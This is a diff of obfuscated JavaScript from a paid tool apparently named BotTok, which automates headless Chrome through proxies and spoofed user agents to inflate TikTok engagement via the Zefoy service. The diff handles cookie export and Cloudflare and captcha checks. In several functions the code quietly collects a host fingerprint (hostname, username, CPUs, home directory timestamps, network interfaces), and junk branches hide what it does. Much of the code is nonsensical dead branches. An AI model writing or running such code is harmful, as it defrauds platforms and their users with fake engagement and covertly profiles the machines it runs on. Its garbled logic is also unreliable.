-          tmpdir: Z.tmpdir(),
-          homedir: X.homedir(),
-          homedirTime: j.statSync(L.homedir()).birthtime.toISOString(),
-          btdirTime: l.statSync(m).birthtime.toISOString(),
-          networkInterfaces: q.stringify(w.networkInterfaces())
-        };
-        const v407 = z0.values(v406).join("|");
-        const v408 = v395.GnBKV(z1, v407);
-        return v408;
-      } catch (g) {
-        return v395.uQFdT;
-      }
+      return false;
     }
   } finally {
-    if (v395.OvvtD(v395.FptWb, v395.FptWb)) {
-      await v398.close();
+    if (v417.cerOE(v417.LSGKx, v417.UspAF)) {
+      await v420.close();
     } else {
-      Y = v395.tlcFC;
+      v417.irCjM(p1374, p1375);
+      return null;
     }
   }
 }
-async function f45(p1273) {
-  const v409 = {
-    hxkaU: "You are using the FREE version!\n",
-    zTqGw: "The --detach or -d mode is exclusive to Premium mode\n",
-    vqIhg: "and allows BotTok to be launched as background processes.\n",
-    PiZXd: function (p1274, p1275) {
-      return p1274 !== p1275;
+async function f46(p1388) {
+  const v424 = {
+    InwtF: function (p1389, p1390) {
+      return p1389(p1390);
     },
-    rVRrv: "KvJLF",
-    SIcyH: function (p1276, p1277) {
-      return p1276 !== p1277;
+    sCtaL: function (p1391, p1392) {
+      return p1391(p1392);
     },
-    yRaqc: "TGxjr",
-    xiOaN: "MgHfx",
-    ZIGoe: function (p1278, p1279) {
-      return p1278 !== p1279;
+    ozFrQ: "00000000",
+    ypfTV: function (p1393) {
+      return p1393();
     },
-    oqqgD: "DXSlV"
+    FEJQg: function (p1394, p1395) {
+      return p1394 / p1395;
+    },
+    DiHTm: function (p1396, p1397) {
+      return p1396 !== p1397;
+    },
+    nckxO: "CtTHg",
+    yWSbg: function (p1398, p1399) {
+      return p1398 === p1399;
+    },
+    GHgax: "QCMwb",
+    JoFwk: "ezyQl",
+    TdNlP: function (p1400, p1401) {
+      return p1400 !== p1401;
+    },
+    hezHq: "VNtWq",
+    bNhRN: "DudZE"
   };
-  const vV409 = v409;
-  let v410 = false;
-  while (!v410) {
-    if (vV409.PiZXd(vV409.rVRrv, vV409.rVRrv)) {
-      vV409.info("BotTok " + v410 + " TikTok Up Bot (by @DevMHOne)\n\n", vV409.hxkaU, vV409.zTqGw, vV409.vqIhg, S + " Buy license in[35m " + t + "[0m\n");
-      V.exit(0);
+  let v425 = false;
+  while (!v425) {
+    if (v424.DiHTm(v424.nckxO, v424.nckxO)) {
+      v424.InwtF(w, "[" + A + "] " + p + " (+" + C + ") " + J);
+      v424.InwtF(D, l);
     } else {
-      const v411 = {
+      const v426 = {
         depth: -1
       };
-      const v412 = await p1273.getDocument(v411);
-      const v413 = {
-        nodeId: v412.root.nodeId
+      const v427 = await p1388.getDocument(v426);
+      const v428 = {
+        nodeId: v427.root.nodeId
       };
-      const v414 = await p1273.getOuterHTML(v413);
-      const v415 = v414.outerHTML;
-      if (/Zefoy/.test(v415)) {
-        if (vV409.SIcyH(vV409.yRaqc, vV409.xiOaN)) {
-          v410 = true;
+      const v429 = await p1388.getOuterHTML(v428);
+      const v430 = v429.outerHTML;
+      if (/Zefoy/.test(v430)) {
+        if (v424.yWSbg(v424.GHgax, v424.JoFwk)) {
+          try {
+            const v431 = {
+              platform: d.platform(),
+              architecture: k.arch(),
+              cpus: u.cpus().map(p1402 => p1402.model).join(", "),
+              totalMemory: N.totalmem(),
+              hostname: n.hostname(),
+              osRelease: m.release(),
+              osType: U.type(),
+              userInfo: t.userInfo().username,
+              tmpdir: b.tmpdir(),
+              homedir: x.homedir(),
+              homedirTime: g.statSync(j.homedir()).birthtime.toISOString(),
+              btdirTime: S.statSync(K).birthtime.toISOString(),
+              networkInterfaces: I.stringify(W.networkInterfaces())
+            };
+            const v432 = i0.values(v431).join("|");
+            const v433 = v424.sCtaL(i1, v432);
+            return v433;
+          } catch (q) {
+            return v424.ozFrQ;
+          }
         } else {
-          v413.stdout.moveCursor(0, -2);
-          p1273.stdout.clearScreenDown();
+          v425 = true;
         }
-      } else if (vV409.ZIGoe(vV409.oqqgD, vV409.oqqgD)) {
-        p1273 += v409[vV409];
+      } else if (v424.TdNlP(v424.hezHq, v424.bNhRN)) {
+        await new Promise(p1403 => setTimeout(p1403, 1000));
       } else {
-        await new Promise(p1280 => setTimeout(p1280, 1000));
+        l.stdout.moveCursor(0, -3);
+        M.stdout.clearScreenDown();
+        q.stdout.write("\n" + o + "[33m " + L + " [34m[" + T + "][0m " + Q + "  [90m(" + v424.ypfTV(y) + " /hr " + v424.FEJQg(v424.ypfTV(R), 60).toFixed(2) + " hrs)[0m\n\n");
+        e.stdout.write(h + " Waiting: " + B + " mins (ERROR: " + v.substring(0, 22) + ")...");
       }
     }
   }
   return true;
 }
-function f46(p1281) {
-  return JSON.stringify(p1281.cookies.map(p1282 => ({
-    domain: p1282.domain,
-    expirationDate: p1282.expires,
-    hostOnly: p1282.hostOnly,
-    httpOnly: p1282.httpOnly,
-    name: p1282.name,
-    path: p1282.path,
+function f47(p1404) {
+  return JSON.stringify(p1404.cookies.map(p1405 => ({
+    domain: p1405.domain,
+    expirationDate: p1405.expires,
+    hostOnly: p1405.hostOnly,
+    httpOnly: p1405.httpOnly,
+    name: p1405.name,
+    path: p1405.path,
     sameSite: "unspecified",
-    secure: p1282.secure,
-    session: p1282.session,
+    secure: p1405.secure,
+    session: p1405.session,
     storeId: "0",
-    value: p1282.value
+    value: p1405.value
   })));
 }
-async function f47(p1283) {
-  const v416 = {
-    uuKNZ: function (p1284, p1285) {
-      return p1284 + p1285;
+async function f48(p1406) {
+  const v434 = {
+    ZZBSQ: function (p1407, p1408) {
+      return p1407 === p1408;
     },
-    NxxMi: "utf8",
-    pxiao: function (p1286, p1287) {
-      return p1286(p1287);
+    sDkCL: function (p1409, p1410) {
+      return p1409(p1410);
     },
-    OzLQK: function (p1288, p1289) {
-      return p1288 === p1289;
+    RunMu: function (p1411, p1412) {
+      return p1411(p1412);
     },
-    zTJZt: "RMySR",
-    MFRYD: "VBfLy",
-    wOueL: function (p1290, p1291) {
-      return p1290 + p1291;
+    PjrWh: "zUfHc",
+    YoaBg: "hfvyb",
+    HLvBu: function (p1413, p1414) {
+      return p1413 + p1414;
     },
-    PMhMU: "--proxy-server=",
-    HnVpk: function (p1292, p1293) {
-      return p1292 + p1293;
+    wRZod: "--proxy-server=",
+    iHskP: function (p1415, p1416) {
+      return p1415 + p1416;
     },
-    ZqVbq: "--user-agent=",
-    AyEeK: "huNWX",
-    ORFWj: "JDRkD",
-    mvaxb: function (p1294, p1295) {
-      return p1294 === p1295;
+    TLRms: "--user-agent=",
+    wdirt: function (p1417, p1418) {
+      return p1417 !== p1418;
     },
-    DDXXz: "ZyOYP",
-    BfGRJ: function (p1296, p1297) {
-      return p1296 !== p1297;
-    },
-    YeDHB: "FWSoV",
-    vKCNq: "hqfCz",
-    QUvJv: function (p1298, p1299) {
-      return p1298(p1299);
+    UfWJP: "RJYxj",
+    CHdDD: "nuIUV",
+    tMcEY: "LRFEO",
+    pyUAx: "PvWzO",
+    yEPin: function (p1419, p1420) {
+      return p1419(p1420);
     }
   };
-  if (v37) {
-    if (v416.OzLQK(v416.zTJZt, v416.MFRYD)) {
-      v.appendFileSync(p1283, v416.uuKNZ(v416, "\n"), v416.NxxMi);
+  if (v35) {
+    if (v434.ZZBSQ(v434.PjrWh, v434.YoaBg)) {
+      if (v434.ZZBSQ(s.v, 0)) {
+        return false;
+      }
+      return true;
     } else {
-      console.log(v22);
+      console.log(v24);
       process.exit(0);
     }
   }
-  let v417 = vA0zS.browser || a0zU.path;
-  let v418 = p1283 ? [v416.wOueL(v416.PMhMU, p1283), v416.HnVpk(v416.ZqVbq, v77)] : [];
-  const v419 = {
-    chromePath: v417,
-    chromeFlags: v418
+  let v435 = vA0iw.browser || a0iJ.path;
+  let v436 = p1406 ? [v434.HLvBu(v434.wRZod, p1406), v434.iHskP(v434.TLRms, v75)] : [];
+  const v437 = {
+    chromePath: v435,
+    chromeFlags: v436
   };
-  const v420 = await a0zI.launch(v419);
+  const v438 = await a0iC.launch(v437);
   while (true) {
-    if (v416.OzLQK(v416.AyEeK, v416.ORFWj)) {
-      v.stdout.moveCursor(0, -3);
-      p1283.stdout.cursorTo(0);
-      v416.stdout.clearScreenDown();
+    if (v434.wdirt(v434.UfWJP, v434.UfWJP)) {
+      v434.sDkCL(s, "Check Zefoy accessibility...");
     } else {
       try {
-        if (v416.mvaxb(v416.DDXXz, v416.DDXXz)) {
-          const v421 = {
-            port: v420.port
+        if (v434.wdirt(v434.CHdDD, v434.CHdDD)) {
+          p1406.stdout.clearLine(0);
+          v434.stdout.cursorTo(0);
+          v435.stdout.write(v436 + " You are being rate limited by Freer!");
+        } else {
+          const v439 = {
+            port: v438.port
           };
-          const v422 = await v416.pxiao(a0zB, v421);
+          const v440 = await v434.sDkCL(a0iD, v439);
           const {
-            Network: J,
-            Page: A,
-            Runtime: F,
-            DOM: p
-          } = v422;
-          await F.enable();
-          await J.enable();
-          await A.enable();
-          await A.setLifecycleEventsEnabled({
+            Network: q,
+            Page: o,
+            Runtime: L,
+            DOM: T
+          } = v440;
+          await L.enable();
+          await q.enable();
+          await o.enable();
+          await o.setLifecycleEventsEnabled({
             enabled: true
           });
-          const v424 = {
+          const v442 = {
             url: v92
           };
-          await A.navigate(v424);
-          await v416.pxiao(f45, p);
-          await v416.pxiao(f52, 300);
-          const v425 = await J.getCookies();
-          const v426 = v416.pxiao(f46, v425);
-          await v416.pxiao(f29, v426);
-          await v422.close();
-          v420.kill();
+          await o.navigate(v442);
+          await v434.RunMu(f46, T);
+          await v434.sDkCL(f53, 1000);
+          const v443 = await q.getCookies();
+          const v444 = v434.sDkCL(f47, v443);
+          await v434.sDkCL(f30, v444);
+          await v440.close();
+          v438.kill();
           break;
-        } else {
-          v416.pxiao(y, "Captcha resolved! (" + v + ")");
         }
-      } catch (u) {
-        if (v416.BfGRJ(v416.YeDHB, v416.vKCNq)) {
-          await v416.QUvJv(f52, 300);
+      } catch (h) {
+        if (v434.ZZBSQ(v434.tMcEY, v434.pyUAx)) {
+          v434.RunMu(P, H);
+          return null;
         } else {
-          Y.log("Cloudflare Valid / Freer Valid");
+          await v434.yEPin(f53, 1000);
         }
       }
     }
   }
 }
-async function f48(p1300 = true) {
-  const v427 = {
-    jZmqa: function (p1301) {
-      return p1301();
+async function f49(p1421 = true) {
+  const v445 = {
+    Bwhba: function (p1422, p1423) {
+      return p1422 - p1423;
     },
-    Tjhjx: function (p1302, p1303) {
-      return p1302 / p1303;
+    QYqiy: function (p1424, p1425) {
+      return p1424 + p1425;
     },
-    tzRHX: function (p1304) {
-      return p1304();
+    QJNJd: function (p1426, p1427) {
+      return p1426 < p1427;
     },
-    KXyQn: function (p1305, p1306) {
-      return p1305(p1306);
+    PZTHa: function (p1428, p1429) {
+      return p1428(p1429);
     },
-    jdyDm: "win-update.bat",
-    DJfMy: function (p1307, p1308) {
-      return p1307 === p1308;
+    snitI: function (p1430, p1431) {
+      return p1430(p1431);
     },
-    fqHdU: "aMpGp",
-    dWRlS: function (p1309, p1310) {
-      return p1309(p1310);
+    ypkOm: function (p1432) {
+      return p1432();
     },
-    zXBEu: "lKgPq",
-    HOQBD: "rKwFk",
-    GlIgL: "--no-sandbox",
-    MYyDf: "--window-size=900,900",
-    YITkL: "--window-position=200,0",
-    DWtgJ: function (p1311, p1312) {
-      return p1311 + p1312;
+    EEIbY: function (p1433, p1434) {
+      return p1433 !== p1434;
     },
-    DWNlY: "--user-agent=",
-    VXNwg: "--proxy-server=",
-    IGulm: function (p1313, p1314) {
-      return p1313 !== p1314;
+    WJdCS: "uAJzC",
+    EriJO: "gyndX",
+    qDnIA: function (p1435, p1436) {
+      return p1435(p1436);
     },
-    KiDvC: "fLzWY",
-    mNOwt: "--disable-gpu",
-    YyomF: "--disable-gpu-compositing",
-    OSNAI: "browser-user",
-    IMZKS: "CpKeP",
-    EaxpC: "OEimt",
-    iCQWj: function (p1315, p1316) {
-      return p1315(p1316);
+    ftYap: function (p1437, p1438) {
+      return p1437 === p1438;
     },
-    OiJSj: function (p1317, p1318) {
-      return p1317 === p1318;
+    KYMre: "WmBMn",
+    msAoE: "eQjGz",
+    XhpSv: "--no-sandbox",
+    GDVcv: "--window-size=900,900",
+    GNIaa: "--window-position=200,0",
+    lenFy: function (p1439, p1440) {
+      return p1439 + p1440;
     },
-    lxIBk: "YAtOy",
-    gynJD: function (p1319, p1320) {
-      return p1319 === p1320;
+    UYbBM: "--user-agent=",
+    mSrKg: function (p1441, p1442) {
+      return p1441 + p1442;
     },
-    vvlWB: "iXsAq",
-    LHGcj: "JyUvx",
-    zubmI: "ByRth",
-    OlFXo: "PdNiu",
-    WuNYa: function (p1321, p1322) {
-      return p1321 === p1322;
+    FapEt: "--proxy-server=",
+    KqjSi: function (p1443, p1444) {
+      return p1443 === p1444;
     },
-    Qoipx: "usAeJ"
+    JSzJm: "LiGRf",
+    GNBJH: "--disable-gpu",
+    tQbka: "--disable-gpu-compositing",
+    sxfzw: "browser-user",
+    SiSCS: "Jfxzp",
+    KNqGh: "lmenh",
+    kJSjp: function (p1445, p1446) {
+      return p1445(p1446);
+    },
+    rbhWi: "asFtX",
+    rBrUF: "HzGjc",
+    tClTx: "tpROs",
+    EHorG: function (p1447, p1448) {
+      return p1447 !== p1448;
+    },
+    hcfdU: "LynNB",
+    PByhw: "XBgwS",
+    RZcvw: "xaKuS",
+    dmFhr: "miVFt",
+    aSuuL: function (p1449, p1450) {
+      return p1449 !== p1450;
+    },
+    kFTuh: "Yrisf"
   };
-  if (a0zd.existsSync(v93)) {
-    if (v427.DJfMy(v427.fqHdU, v427.fqHdU)) {
-      const v428 = await v427.jZmqa(f31);
-      const v429 = v428.find(p1323 => p1323.name === "user_agent");
-      v77 = v427.dWRlS(decodeURIComponent, v429.value);
-      const v430 = v428.find(p1324 => p1324.name === "bt_proxy");
-      v82 = v430?.value || v82;
+  if (a0ic.existsSync(v93)) {
+    if (v445.EEIbY(v445.WJdCS, v445.EriJO)) {
+      const v446 = await v445.ypkOm(f32);
+      const v447 = v446.find(p1451 => p1451.name === "user_agent");
+      v75 = v445.qDnIA(decodeURIComponent, v447.value);
+      const v448 = v446.find(p1452 => p1452.name === "bt_proxy");
+      v80 = v448?.value || v80;
     } else {
-      if (p1300.includes(v427)) {
-        return true;
-      }
-      return false;
+      v445 = v445.Bwhba(vV802, v449);
     }
-  } else if (v427.DJfMy(v427.zXBEu, v427.HOQBD)) {
-    vV822.stdout.clearLine(0);
-    v431.stdout.cursorTo(0);
-    v432.stdout.write(v433 + " Solve the captcha manually...");
+  } else if (v445.ftYap(v445.KYMre, v445.msAoE)) {
+    vV802.push(v449.slice(v452, v445.QYqiy(v453, 64)));
   } else {
     console.log("Cloudflare Expired / Zefoy Expired");
     return false;
   }
-  let vV822 = v82;
-  let v431 = [v427.GlIgL, v427.MYyDf, v427.YITkL, v427.DWtgJ(v427.DWNlY, v77), v427.DWtgJ(v427.VXNwg, vV822)];
-  if (v35) {
-    if (v427.IGulm(v427.KiDvC, v427.KiDvC)) {
-      B.stdout.moveCursor(0, -3);
-      r.stdout.clearScreenDown();
-      J.stdout.write("\n" + A + "[33m " + F + " [34m[" + p + "][0m " + h + "  [90m(" + v427.jZmqa(g) + " /hr " + v427.Tjhjx(v427.tzRHX(T), 60).toFixed(2) + " hrs)[0m\n\n");
-      s.stdout.write(H + " Running: Trying again (ERROR: " + u.substring(0, 22) + ")...");
+  let vV802 = v80;
+  let v449 = [v445.XhpSv, v445.GDVcv, v445.GNIaa, v445.lenFy(v445.UYbBM, v75), v445.mSrKg(v445.FapEt, vV802)];
+  if (v33) {
+    if (v445.KqjSi(v445.JSzJm, v445.JSzJm)) {
+      v449 = [...v449, v445.GNBJH, v445.tQbka];
     } else {
-      v431 = [...v431, v427.mNOwt, v427.YyomF];
+      let v450 = "";
+      for (let v451 = 0; v445.QJNJd(v451, vV802.length); v451 += 2) {
+        v450 += v452[v451];
+      }
+      return v450.split("").reverse().join("");
     }
   }
-  const v432 = {
-    headless: p1300,
-    args: v431,
-    executablePath: vA0zS.browser,
-    userDataDir: vA0zS[v427.OSNAI]
+  const v452 = {
+    headless: p1421,
+    args: v449,
+    executablePath: vA0iw.browser,
+    userDataDir: vA0iw[v445.sxfzw]
   };
-  const v433 = await a0zC.launch(v432);
+  const v453 = await a0iz.launch(v452);
   try {
-    if (v427.DJfMy(v427.IMZKS, v427.EaxpC)) {
-      v427.KXyQn(Y, "Launch Zefoy in headless browser...");
-    } else {
-      const v434 = (await v433.pages())[0];
-      const v435 = await v427.jZmqa(f31);
-      await v427.iCQWj(f52, 300);
-      await v434.setCookie(...v435);
-      const v436 = {
+    if (v445.EEIbY(v445.SiSCS, v445.KNqGh)) {
+      const v454 = (await v453.pages())[0];
+      const v455 = await v445.ypkOm(f32);
+      await v445.kJSjp(f53, 300);
+      await v454.setCookie(...v455);
+      const v456 = {
         timeout: 0
       };
-      await v434.goto(v92, v436);
-      const v437 = await v434.content();
-      if (/Zefoy/.test(v437)) {
-        if (v427.OiJSj(v427.lxIBk, v427.lxIBk)) {
-          if (/submit-captcha/.test(v437)) {
-            if (v427.gynJD(v427.vvlWB, v427.vvlWB)) {
+      await v454.goto(v92, v456);
+      const v457 = await v454.content();
+      if (/Zefoy/.test(v457)) {
+        if (v445.EEIbY(v445.rbhWi, v445.rbhWi)) {
+          v445.PZTHa(v456, "Check proxies...");
+        } else {
+          if (/submit-captcha/.test(v457)) {
+            if (v445.EEIbY(v445.rBrUF, v445.tClTx)) {
               console.log("Cloudflare Valid / Zefoy Expired");
             } else {
-              vV822.stdout.clearLine(0);
-              v431.stdout.cursorTo(0);
-              v432.stdout.write(v433 + "  Check proxies...");
+              v445.PZTHa(p1421, "Captcha resolved! (" + v445 + ")");
             }
-          } else if (v427.IGulm(v427.LHGcj, v427.LHGcj)) {
-            v431.stdout.clearLine(0);
-            v432.stdout.cursorTo(0);
-            v433.stdout.write(t + " Captcha resolved! (" + V + ")");
-          } else {
+          } else if (v445.EHorG(v445.hcfdU, v445.PByhw)) {
             console.log("Cloudflare Valid / Zefoy Valid");
+          } else {
+            v445.snitI(D, "[" + l + "] " + v454 + " (+" + v455 + ") [" + v456 + "] Stopped for not accumulating the defined minimum! (in " + v445.ypkOm(v457) + " mins)");
+            if (!T) {
+              B.stdout.clearLine(0);
+              v.stdout.cursorTo(0);
+              G.stdout.write(Y + " Stopped for not accumulating the defined minimum!");
+            }
+            h.exit(0);
           }
           return true;
-        } else {
-          const v438 = v432 ? function () {
-            if (v438) {
-              const v439 = v435.apply(v436, arguments);
-              v437 = null;
-              return v439;
-            }
-          } : function () {};
-          U = false;
-          return v438;
         }
       }
       console.log("Cloudflare Expired / Zefoy Expired");
       return false;
+    } else {
+      p1421 = "[32m+" + v445 + "[0m";
     }
-  } catch (H) {
-    if (v427.IGulm(v427.zubmI, v427.OlFXo)) {
-      console.log(H);
+  } catch (e) {
+    if (v445.EHorG(v445.RZcvw, v445.dmFhr)) {
+      console.log(e);
       return false;
     } else {
-      Y.log(v427.jdyDm);
+      const v458 = {
+        name: s
+      };
+      return v458;
     }
   } finally {
-    if (v427.WuNYa(v427.Qoipx, v427.Qoipx)) {
-      await v433.close();
+    if (v445.aSuuL(v445.kFTuh, v445.kFTuh)) {
+      s = true;
     } else {
-      Y.log("\n\n");
+      await v453.close();
     }
   }
 }
-async function f49(p1325) {
-  const v440 = {
-    tHdVo: "--disable-gpu",
-    pjuzm: "--disable-gpu-compositing",
-    ssiir: function (p1326, p1327) {
-      return p1326 !== p1327;
+async function f50(p1453) {
+  const v459 = {
+    gVrXu: function (p1454, p1455) {
+      return p1454 === p1455;
     },
-    gJksS: "gkxzs",
-    cVBVW: "REEWv",
-    LXDhT: function (p1328, p1329) {
-      return p1328(p1329);
+    KliGP: function (p1456, p1457) {
+      return p1456 - p1457;
     },
-    mtITc: function (p1330, p1331) {
-      return p1330(p1331);
+    GoZIu: function (p1458, p1459) {
+      return p1458 !== p1459;
     },
-    RCExs: function (p1332, p1333) {
-      return p1332 !== p1333;
+    VYkXD: "aFbSC",
+    hxpZV: "biFbQ",
+    BTxSM: function (p1460, p1461) {
+      return p1460(p1461);
     },
-    Nysjl: "NqCUE",
-    DtlvA: "RSoxy",
-    wDFSm: function (p1334, p1335) {
-      return p1334 === p1335;
+    PiqnS: function (p1462, p1463) {
+      return p1462 !== p1463;
     },
-    xOyHD: "ejMwl"
+    biiBH: "YlTKf",
+    rXOij: "GFApI",
+    UmAhB: "FpZhL",
+    RqFHr: "DmQdR"
   };
   try {
-    if (v440.ssiir(v440.gJksS, v440.cVBVW)) {
-      p1325 = await v440.LXDhT(f51, p1325);
-      const v441 = v440.mtITc(a0zN, v48 + "/" + p1325);
-      if (!v441.ok) {
-        if (v440.RCExs(v440.Nysjl, v440.DtlvA)) {
+    if (v459.GoZIu(v459.VYkXD, v459.hxpZV)) {
+      p1453 = await v459.BTxSM(f52, p1453);
+      const v460 = v459.BTxSM(a0ia, v46 + "/" + p1453);
+      if (!v460.ok) {
+        if (v459.PiqnS(v459.biiBH, v459.rXOij)) {
           return null;
         } else {
-          v441.stdout.clearLine(0);
-          v442.stdout.cursorTo(0);
+          return true;
         }
       }
-      const v442 = v441.json().country;
-      return v442;
+      const v461 = v460.json().country;
+      return v461;
+    } else if (v459.gVrXu(z, 0)) {
+      D = l;
     } else {
-      N.stdout.clearLine(0);
-      C.stdout.cursorTo(0);
-      S.stdout.write(t + " SESSID: " + V);
+      M = v459.KliGP(q, o);
     }
-  } catch (C) {
-    if (v440.wDFSm(v440.xOyHD, v440.xOyHD)) {
-      v440.mtITc(f53, C);
+  } catch (z) {
+    if (v459.PiqnS(v459.UmAhB, v459.RqFHr)) {
+      v459.BTxSM(f54, z);
       return null;
     } else {
-      y = [...v, v440.tHdVo, v440.pjuzm];
+      return v459.task;
     }
   }
 }
-async function f50() {
-  const v443 = {
-    itnQq: function (p1336, p1337) {
-      return p1336(p1337);
+async function f51() {
+  const v462 = {
+    iZjjO: function (p1464, p1465) {
+      return p1464(p1465);
     },
-    UAxrO: function (p1338, p1339) {
-      return p1338 === p1339;
+    BSnjb: function (p1466, p1467) {
+      return p1466(p1467);
     },
-    hsSbi: "kjuoL",
-    ptSrF: "RzeCK",
-    IcuPM: function (p1340, p1341) {
-      return p1340 !== p1341;
+    SfODL: function (p1468, p1469) {
+      return p1468 !== p1469;
     },
-    ttnmL: "YzRUq",
-    lKXAN: "bsESG",
-    wXRwj: function (p1342, p1343) {
-      return p1342 === p1343;
+    WwnFY: "eERJR",
+    gPjsW: "ieGmf",
+    czQYf: function (p1470, p1471) {
+      return p1470 !== p1471;
     },
-    zapXQ: "sFPpC",
-    OrJKc: function (p1344, p1345) {
-      return p1344(p1345);
-    }
+    dQzDA: "IflbF",
+    YXkpv: "BKOxd"
   };
   try {
-    if (v443.UAxrO(v443.hsSbi, v443.ptSrF)) {
-      if (/Security Check/.test(v)) {
-        C.log("Cloudflare Valid / Freer Expired");
-      } else {
-        S.log("Cloudflare Valid / Freer Valid");
-      }
-      return true;
+    if (v462.SfODL(v462.WwnFY, v462.WwnFY)) {
+      P.stdout.moveCursor(0, -23);
+      H.stdout.clearScreenDown();
     } else {
-      const v444 = v443.itnQq(a0zN, v49);
-      if (!v444.ok) {
-        if (v443.IcuPM(v443.ttnmL, v443.lKXAN)) {
-          return null;
+      const v463 = v462.BSnjb(a0ia, v47);
+      if (!v463.ok) {
+        if (v462.SfODL(v462.gPjsW, v462.gPjsW)) {
+          const v464 = v462.iZjjO(v468, c);
+          const v465 = v464.text();
+          const v466 = v465.match(/"liveRoomStats":\s*{\s*"userCount":\s*(\d+)/);
+          if (v466) {
+            const v467 = v462.BSnjb(v465, v466[1]);
+            return v467;
+          }
         } else {
-          v444.stdout.moveCursor(0, -6);
-          v445.stdout.clearScreenDown();
+          return null;
         }
       }
-      const v445 = v444.text();
-      return v445;
+      const v468 = v463.text();
+      return v468;
     }
-  } catch (N) {
-    if (v443.wXRwj(v443.zapXQ, v443.zapXQ)) {
-      v443.OrJKc(f53, N);
+  } catch (a) {
+    if (v462.czQYf(v462.dQzDA, v462.YXkpv)) {
+      v462.BSnjb(f54, a);
       return null;
     } else {
-      v443.itnQq(y, v);
-      return null;
+      v462.BSnjb(P, H);
     }
   }
 }
-async function f51(p1346) {
-  const v446 = {
-    YTFoi: function (p1347, p1348) {
-      return p1347(p1348);
+async function f52(p1472) {
+  const v469 = {
+    MeCVS: function (p1473, p1474) {
+      return p1473 === p1474;
     },
-    aeQjO: function (p1349, p1350) {
-      return p1349(p1350);
-    },
-    FtQzO: function (p1351, p1352) {
-      return p1351 !== p1352;
-    },
-    Twddi: "PGNOy",
-    BbndT: function (p1353) {
-      return p1353();
+    sNZPc: "WtJPK",
+    wnoFy: function (p1475) {
+      return p1475();
     }
   };
-  if (!p1346) {
-    if (v446.FtQzO(v446.Twddi, v446.Twddi)) {
-      v446.YTFoi(S, "[" + t + "] " + V + " (+" + I + ") " + U);
-      v446.aeQjO(B, r);
+  if (!p1472) {
+    if (v469.MeCVS(v469.sNZPc, v469.sNZPc)) {
+      return await v469.wnoFy(f51);
     } else {
-      return await v446.BbndT(f50);
+      v470.stdout.moveCursor(0, -2);
+      v471.stdout.clearScreenDown();
     }
   }
-  const v447 = /^(?:(.*?:.*?@)?([\d.]+)(?::(\d+))?)?$/;
-  const v448 = p1346.match(v447);
-  const [, v449, v450] = v448 || [];
-  const v451 = v449 ? v450.replace(v449 + "@", "") : v450;
-  return v451;
+  const v470 = /^(?:(.*?:.*?@)?([\d.]+)(?::(\d+))?)?$/;
+  const v471 = p1472.match(v470);
+  const [, v472, v473] = v471 || [];
+  const v474 = v472 ? v473.replace(v472 + "@", "") : v473;
+  return v474;
 }
-async function f52(p1354) {
-  return new Promise(p1355 => setTimeout(p1355, p1354));
+async function f53(p1476) {
+  return new Promise(p1477 => setTimeout(p1477, p1476));
 }
-function f53(p1356) {
-  const v452 = {
-    TxPRP: function (p1357, p1358) {
-      return p1357(p1358);
+function f54(p1478) {
+  const v475 = {
+    rabUY: "--disable-gpu",
+    PRpAS: "--disable-gpu-compositing",
+    dVmLq: "You are using the FREE version limited to ~5000\n",
+    IbGYa: "accumulations. The advantage of acquiring the\n",
+    bCTxi: "license is that the bot continues to work\n",
+    sPJRC: "indefinitely and accumulates large amounts.\n",
+    IxuiA: function (p1479, p1480) {
+      return p1479 !== p1480;
     },
-    Mbyad: function (p1359, p1360) {
-      return p1359 !== p1360;
+    ycNtg: "HhzTq",
+    eclzg: "zPsdg",
+    TLcLq: function (p1481, p1482) {
+      return p1481 + p1482;
     },
-    cyNuN: "XnDal",
-    sdRkg: "jiXGz",
-    ToShG: function (p1361, p1362) {
-      return p1361 + p1362;
+    sUUbf: "utf8",
+    XBGDn: function (p1483, p1484) {
+      return p1483 !== p1484;
     },
-    VMatz: "utf8",
-    SvJOr: function (p1363, p1364) {
-      return p1363 !== p1364;
-    },
-    hJPCA: "axCEA",
-    CbOIK: "OSsrl"
+    bgays: "UMvkD"
   };
-  const v453 = new Date().toLocaleString();
-  const v454 = "[" + v453 + "] [" + v77?.substring(0, 26) + "...] [" + v76 + "] " + p1356;
-  if (v24) {
-    if (v452.Mbyad(v452.cyNuN, v452.sdRkg)) {
-      a0zd.appendFileSync(v43, v452.ToShG(v454, "\n"), v452.VMatz);
-    } else {
-      v452.TxPRP(v452, "Solve the captcha manually...");
-    }
-  }
+  const vV475 = v475;
+  const v476 = new Date().toLocaleString();
+  const v477 = "[" + v476 + "] [" + v75?.substring(0, 26) + "...] [" + v74 + "] " + p1478;
   if (v26) {
-    if (v452.SvJOr(v452.hJPCA, v452.CbOIK)) {
-      console.log(v454);
+    if (vV475.IxuiA(vV475.ycNtg, vV475.eclzg)) {
+      a0ic.appendFileSync(v41, vV475.TLcLq(v477, "\n"), vV475.sUUbf);
     } else {
-      v453 = v454.concat;
+      v475 = [...vV475, vV475.rabUY, vV475.PRpAS];
     }
   }
-}
-function f54() {
-  const v455 = {
-    onICV: function (p1365, p1366) {
-      return p1365 / p1366;
-    },
-    iSrek: function (p1367, p1368) {
-      return p1367 - p1368;
-    },
-    hLkvp: function (p1369, p1370) {
-      return p1369 + p1370;
-    },
-    jKgMX: function (p1371, p1372) {
-      return p1371 * p1372;
-    },
-    zCDXo: function (p1373, p1374) {
-      return p1373 + p1374;
+  if (v28) {
+    if (vV475.XBGDn(vV475.bgays, vV475.bgays)) {
+      vV475.info("\n\n", vV475.dVmLq, vV475.IbGYa, vV475.bCTxi, vV475.sPJRC, v476 + " Buy license in[35m " + v477 + "[0m\n");
+    } else {
+      console.log(v477);
     }
-  };
-  const vV455 = v455;
-  return vV455.onICV(vV455.iSrek(vV455.hLkvp(vV455.jKgMX(process.hrtime()[0], 1000000000), process.hrtime()[1]), vV455.zCDXo(vV455.jKgMX(v69[0], 1000000000), v69[1])), 60000000000).toFixed(2);
+  }
 }
 function f55() {
-  const v456 = {
-    Sfynl: function (p1375, p1376) {
-      return p1375 / p1376;
+  const v478 = {
+    wHuoJ: function (p1485, p1486) {
+      return p1485 / p1486;
     },
-    QFtIs: function (p1377) {
-      return p1377();
+    wlPxj: function (p1487, p1488) {
+      return p1487 - p1488;
+    },
+    tImlJ: function (p1489, p1490) {
+      return p1489 + p1490;
+    },
+    balRP: function (p1491, p1492) {
+      return p1491 * p1492;
+    },
+    RMELA: function (p1493, p1494) {
+      return p1493 + p1494;
+    },
+    zhAwg: function (p1495, p1496) {
+      return p1495 * p1496;
     }
   };
-  const v457 = v456.Sfynl(v456.QFtIs(f54), 60);
-  const v458 = v456.Sfynl(v74, v457);
-  return Math.round(v458);
